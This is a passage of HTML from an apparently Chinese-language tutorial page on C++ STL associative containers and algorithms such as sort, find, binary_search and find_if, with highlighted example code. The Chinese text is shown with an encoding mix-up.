x);<br>&#125;<br><span class="hljs-comment">//è¿­ä»£å™¨å†™æ³•</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = s<span class="hljs-number">2.</span><span class="hljs-built_in">begin</span>(); it != s<span class="hljs-number">2.</span><span class="hljs-built_in">end</span>(); ++it) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, *it);<br>&#125;<br><br><span class="hljs-comment">//æŸ¥æ‰¾å…ƒç´ </span><br><span class="hljs-keyword">auto</span> it = s.<span class="hljs-built_in">find</span>(<span class="hljs-number">3</span>);  <span class="hljs-comment">// æŸ¥æ‰¾å…ƒç´  3</span><br><span class="hljs-keyword">if</span> (it != s.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found: %d\n&quot;</span>, *it);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Not found\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨ï¼Œcount è¦ä¹ˆè¿”å› 0ï¼ˆä¸å­˜åœ¨ï¼‰ï¼Œè¦ä¹ˆè¿”å› 1ï¼ˆå­˜åœ¨ï¼‰ã€‚</span><br>std::set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">count</span>(<span class="hljs-number">3</span>)) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3 is in the set\n&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3 is not in the set\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//è·å– set çš„å¤§å°</span><br>set&lt;<span class="hljs-type">int</span>&gt; s = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: %zu\n&quot;</span>, s.<span class="hljs-built_in">size</span>());<br><br><br></code></pre></td></tr></table></figure><p><strong><code>map</code></strong> é”®å€¼å¯¹å½¢å¼å­˜å‚¨ï¼ŒæŒ‰é”®æ’åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++">map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; m = &#123;&#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;&#125;; <span class="hljs-comment">// è‡ªåŠ¨æ’åºï¼Œé‡å¤é”®çš„å€¼ä¼šè¢«è¦†ç›–</span><br>map&lt;string, <span class="hljs-type">int</span>&gt; m;<br>m.<span class="hljs-built_in">insert</span>(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">10</span>&#125;);<br><span class="hljs-comment">// æ’å…¥ä¸€ä¸ªé‡å¤çš„é”®ï¼Œä¸ä¼šæˆåŠŸ</span><br>m.<span class="hljs-built_in">insert</span>(&#123;<span class="hljs-number">3</span>, <span class="hljs-number">40</span>&#125;);  <span class="hljs-comment">// é”® 3 å·²å­˜åœ¨ï¼Œä¸ä¼šæ’å…¥</span><br><br><span class="hljs-comment">//æŸ¥æ‰¾å…ƒç´ </span><br><span class="hljs-keyword">auto</span> it = m.<span class="hljs-built_in">find</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// æŸ¥æ‰¾é”®ä¸º 2 çš„å…ƒç´ </span><br><span class="hljs-keyword">if</span> (it != m.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found: %d -&gt; %d\n&quot;</span>, it-&gt;first, it-&gt;second);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Not found\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//åˆ é™¤å…ƒç´ </span><br>m.<span class="hljs-built_in">erase</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// åˆ é™¤é”®ä¸º 2 çš„å…ƒç´ </span><br><br><span class="hljs-comment">//è·å– map çš„å¤§å°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: %zu\n&quot;</span>, m.<span class="hljs-built_in">size</span>());<span class="hljs-comment">//Size: 3</span><br><br><br>m[<span class="hljs-string">&quot;apple&quot;</span>] = <span class="hljs-number">3</span>;<br>m[<span class="hljs-string">&quot;banana&quot;</span>] = <span class="hljs-number">2</span>;<br>m[<span class="hljs-string">&quot;orange&quot;</span>] = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; pair : m) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s -&gt; %d\n&quot;</span>, pair.first.<span class="hljs-built_in">c_str</span>(), pair.second);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="3-æ— åºå…³è”å®¹å™¨"><a href="#3-æ— åºå…³è”å®¹å™¨" class="headerlink" title="3. æ— åºå…³è”å®¹å™¨"></a>3. <strong>æ— åºå…³è”å®¹å™¨</strong></h5><p>æ— åºå…³è”å®¹å™¨æ˜¯åŸºäºå“ˆå¸Œè¡¨å®ç°çš„å®¹å™¨ï¼Œå…ƒç´ æ— åºæ’åˆ—ï¼Œä½†æ”¯æŒå¸¸æ•°æ—¶é—´å¤æ‚åº¦çš„æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤æ“ä½œã€‚å¸¸è§çš„æ— åºå…³è”å®¹å™¨æœ‰ï¼š</p><ul><li><code>unordered_set</code>ï¼šæ— åºé›†åˆï¼Œå…ƒç´ å”¯ä¸€ã€‚</li><li><code>unordered_map</code>ï¼šæ— åºé”®å€¼å¯¹ï¼ŒåŸºäºå“ˆå¸Œè¡¨å­˜å‚¨ã€‚</li></ul><p><strong><code>unordered_set</code></strong> æ— åºé›†åˆï¼Œå…ƒç´ å”¯ä¸€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">unordered_set</span>&lt;<span class="hljs-type">int</span>&gt; uset = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;  <span class="hljs-comment">// é‡å¤çš„1è¢«å¿½ç•¥</span><br>uset.insert(<span class="hljs-number">5</span>);  <span class="hljs-comment">// æ’å…¥æ–°å…ƒç´ </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : uset) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºé¡ºåºä¸å›ºå®šï¼Œä¾‹å¦‚ï¼š3 1 2 4 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>unordered_map</code></strong> æ— åºé”®å€¼å¯¹ï¼ŒåŸºäºå“ˆå¸Œè¡¨å­˜å‚¨</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">unordered_map&lt;string, <span class="hljs-type">int</span>&gt; umap;<br>umap[<span class="hljs-string">&quot;apple&quot;</span>] = <span class="hljs-number">3</span>;<br>umap[<span class="hljs-string">&quot;banana&quot;</span>] = <span class="hljs-number">2</span>;<br>umap[<span class="hljs-string">&quot;orange&quot;</span>] = <span class="hljs-number">4</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; [key, value] : umap) &#123;<br>    cout &lt;&lt; key &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">// è¾“å‡ºé¡ºåºä¸å›ºå®šï¼Œä¾‹å¦‚ï¼š</span><br>banana: <span class="hljs-number">2</span> apple: <span class="hljs-number">3</span> orange: <span class="hljs-number">4</span><br> &#125;<br><br></code></pre></td></tr></table></figure><h4 id="ä¸‰ã€ç®—æ³•-Algorithms"><a href="#ä¸‰ã€ç®—æ³•-Algorithms" class="headerlink" title="ä¸‰ã€ç®—æ³• (Algorithms)"></a>ä¸‰ã€ç®—æ³• (Algorithms)</h4><p>STL æä¾›äº†ä¸€ç³»åˆ—çš„ç®—æ³•æ¥æ“ä½œå®¹å™¨ï¼Œå¦‚æ’åºã€æŸ¥æ‰¾ã€ä¿®æ”¹ç­‰ã€‚è¿™äº›ç®—æ³•å®šä¹‰åœ¨å¤´æ–‡ä»¶ <code>&lt;algorithm&gt;</code> ä¸­ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è¿­ä»£å™¨è®¿é—®å®¹å™¨çš„å…ƒç´ ã€‚</p><h5 id="1-å¸¸ç”¨ç®—æ³•"><a href="#1-å¸¸ç”¨ç®—æ³•" class="headerlink" title="1. å¸¸ç”¨ç®—æ³•"></a>1. <strong>å¸¸ç”¨ç®—æ³•</strong></h5><ul><li><code>sort</code>ï¼šå¯¹å®¹å™¨è¿›è¡Œæ’åºã€‚</li><li><code>find</code>ï¼šæŸ¥æ‰¾æŸä¸ªå…ƒç´ ã€‚</li><li><code>binary_search</code>ï¼šäºŒåˆ†æŸ¥æ‰¾ï¼Œè¦æ±‚å®¹å™¨æ˜¯æœ‰åºçš„ã€‚</li><li><code>reverse</code>ï¼šå°†å®¹å™¨ä¸­çš„å…ƒç´ åè½¬ã€‚</li><li><code>accumulate</code>ï¼šè®¡ç®—å®¹å™¨ä¸­å…ƒç´ çš„ç´¯åŠ å’Œã€‚</li><li><code>count</code>ï¼šç»Ÿè®¡å®¹å™¨ä¸­æŸä¸ªå…ƒç´ çš„å‡ºç°æ¬¡æ•°ã€‚</li></ul><p><strong><code>sort</code></strong> å¯¹å®¹å™¨è¿›è¡Œæ’åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// å‡åºæ’åº</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>    cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š1 2 3 4 5</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>find</code></strong> æŸ¥æ‰¾æŸä¸ªå…ƒç´ </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (it != vec.<span class="hljs-built_in">end</span>()) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element found: &quot;</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼šElement found: 3</span><br> &#125; <span class="hljs-keyword">else</span> &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>binary_search</code></strong> äºŒåˆ†æŸ¥æ‰¾ï¼ˆè¦æ±‚å®¹å™¨æ˜¯æœ‰åºçš„ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">bool</span> found = <span class="hljs-built_in">binary_search</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (found) &#123;<br>     cout &lt;&lt; <span class="hljs-string">&quot;Element found\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼šElement found</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>     cout &lt;&lt; <span class="hljs-string">&quot;Element not found\n&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>reverse</code></strong> å°†å®¹å™¨ä¸­çš„å…ƒç´ åè½¬</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-built_in">reverse</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>   cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š5 4 3 2 1</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>accumulate</code></strong> è®¡ç®—å®¹å™¨ä¸­å…ƒç´ çš„ç´¯åŠ å’Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> sum = <span class="hljs-built_in">accumulate</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// åˆå§‹å€¼ä¸º0</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼šSum: 15</span><br></code></pre></td></tr></table></figure><p><strong><code>count</code></strong> ç»Ÿè®¡å®¹å™¨ä¸­æŸä¸ªå…ƒç´ çš„å‡ºç°æ¬¡æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> cnt = <span class="hljs-built_in">count</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">2</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;Count of 2: &quot;</span> &lt;&lt; cnt &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼šCount of 2: 3</span><br></code></pre></td></tr></table></figure><h5 id="2-è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°"><a href="#2-è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°" class="headerlink" title="2. è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°"></a>2. <strong>è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</strong></h5><p><strong><code>sort</code></strong> ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>sort</code> ä¼šè¿›è¡Œå‡åºæ’åºã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ªè‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°æ¥æ§åˆ¶æ’åºæ–¹å¼ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼Œå®ç°é™åºæ’åº</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">descending</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), descending);  <span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : vec) &#123;<br>      cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// è¾“å‡ºï¼š5 4 3 2 1</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; v = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>&#125;;<br>    <span class="hljs-comment">// ä½¿ç”¨ Lambda è¡¨è¾¾å¼ä½œä¸ºè‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ŒæŒ‰é™åºæ’åº</span><br>    <span class="hljs-built_in">sort</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;);<br>    <span class="hljs-comment">// è¾“å‡ºæ’åºåçš„ç»“æœ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : v) &#123;<br>        cout &lt;&lt; num &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//å¯¹ç»“æ„ä½“æ•°ç»„æ’åº</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    std::string name;<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼ŒæŒ‰å¹´é¾„å‡åºæ’åº</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">compareByAge</span><span class="hljs-params">(<span class="hljs-type">const</span> Person&amp; a, <span class="hljs-type">const</span> Person&amp; b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a.age &lt; b.age;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    vector&lt;Person&gt; people = &#123;&#123;<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">30</span>&#125;, &#123;<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">25</span>&#125;, &#123;<span class="hljs-string">&quot;Charlie&quot;</span>, <span class="hljs-number">35</span>&#125;&#125;;<br>    <span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°æŒ‰å¹´é¾„å‡åºæ’åº</span><br>    <span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), compareByAge);<br>    <span class="hljs-comment">// ä½¿ç”¨ Lambda è¡¨è¾¾å¼æŒ‰å¹´é¾„å‡åºæ’åº</span><br>    std::<span class="hljs-built_in">sort</span>(people.<span class="hljs-built_in">begin</span>(), people.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> Person&amp; a, <span class="hljs-type">const</span> Person&amp; b) &#123;<span class="hljs-keyword">return</span> a.age &lt; b.age;&#125;);<br>    <span class="hljs-comment">// è¾“å‡ºæ’åºåçš„ç»“æœ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> Person&amp; p : people) &#123;<br>        cout &lt;&lt; p.name &lt;&lt; <span class="hljs-string">&quot;: &quot;</span> &lt;&lt; p.age &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>find_if</code></strong> ä½¿ç”¨è‡ªå®šä¹‰æ¡ä»¶</p><p><code>find_if</code> å¯æ ¹æ®è‡ªå®šä¹‰çš„ <strong>è°“è¯å‡½æ•°</strong> æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; v = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>&#125;;<br><span class="hljs-comment">// ä½¿ç”¨ lambda è¡¨è¾¾å¼æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¤§äº 10 ä¸”æ˜¯å¶æ•°çš„å…ƒç´ </span><br><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find_if</span>(v.<span class="hljs-built_in">begin</span>(), v.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> x) &#123; <span class="hljs-keyword">return</span> x &gt; <span class="hljs-number">10</span> &amp;&amp; x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>; &#125;);<br><span class="hljs-keyword">if</span> (it != v.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found: &quot;</span> &lt;&lt; *it &lt;&lt; std::endl;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br><br>map&lt;string, <span class="hljs-type">int</span>&gt; m = &#123;&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-number">3</span>&#125;&#125;;<br><span class="hljs-comment">// æŸ¥æ‰¾ç¬¬ä¸€ä¸ªé”®å¤§äº &quot;banana&quot; çš„å…ƒç´ </span><br><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find_if</span>(m.<span class="hljs-built_in">begin</span>(), m.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">const</span> pair&lt;string, <span class="hljs-type">int</span>&gt;&amp; p) &#123;<span class="hljs-keyword">return</span> p.first &gt; <span class="hljs-string">&quot;banana&quot;</span>;  <span class="hljs-comment">// æŒ‰ç…§é”®çš„å­—å…¸é¡ºåº&#125;);</span><br><span class="hljs-keyword">if</span> (it != m.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found: &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="hljs-string">&quot; -&gt; &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; std::endl;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>binary_search</code></strong> è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°</p><p><code>binary_search</code> ä¹Ÿå¯ä»¥æ¥å—è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°ï¼Œä½†è¦æ±‚å®¹å™¨ä¸­çš„å…ƒç´ æŒ‰è¯¥è§„åˆ™é¢„å…ˆæ’åºã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// è‡ªå®šä¹‰æ¯”è¾ƒå‡½æ•°ï¼Œè¿›è¡Œé™åºæ¯”è¾ƒ</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">descending</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> a &gt; b;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span 